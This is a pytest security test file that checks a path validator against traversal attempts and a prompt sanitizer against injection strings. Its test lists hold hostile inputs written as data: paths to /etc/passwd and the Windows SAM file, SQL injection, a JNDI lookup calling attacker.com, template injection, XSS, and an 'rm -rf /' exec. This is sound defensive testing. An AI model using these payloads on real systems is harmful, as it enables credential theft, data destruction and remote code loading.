import sys
from pathlib import Path
import pytest

sys.path.append(str(Path(__file__).resolve().parents[2]))
from utils.validation import sanitize_prompt, validate_file_path
from exceptions import FileOperationError


@pytest.mark.security
class TestInputValidationSecurity:
    @pytest.mark.asyncio
    async def test_path_traversal_attacks(self, tmp_path: Path) -> None:
        attack_vectors = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "..../..../etc/passwd",
            "..///////..////..//////etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ]
        allowed = tmp_path / "allowed"
        allowed.mkdir()
        for attack in attack_vectors:
            with pytest.raises(FileOperationError):
                validate_file_path(Path(attack), [allowed])

    @pytest.mark.asyncio
    async def test_prompt_injection_attacks(self) -> None:
        injection_attempts = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "${jndi:ldap://attacker.com/exploit}",
            "{{constructor.constructor('return process')().exit()}}",
            "<script>alert('xss')</script>",
            "UNION SELECT password FROM users--",
            '"; exec('"'"'rm -rf /'"'"');//',
            "\x00\x00\x00\x00",
        ]
        for injection in injection_attempts:
            sanitized = sanitize_prompt(injection)
            assert "<" not in sanitized and ">" not in sanitized
